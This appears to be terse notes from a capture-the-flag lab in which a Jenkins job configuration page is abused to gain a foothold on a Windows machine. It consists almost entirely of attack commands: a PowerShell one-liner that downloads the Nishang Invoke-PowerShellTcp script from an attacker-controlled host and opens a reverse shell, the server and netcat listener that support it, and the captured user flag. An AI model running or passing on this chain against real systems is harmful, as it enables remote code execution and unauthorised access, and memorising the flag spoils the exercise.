```
http://10.10.246.119:8080/job/project/configure

powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.12.46:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.12.46 -Port 4242

wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1

python -m SimpleHTTPServer 8000

nc -lvnp 4242

PS C:\Users\bruce\Desktop> type user.txt
79007a09481963edf2e1321abd9ae2a0
```
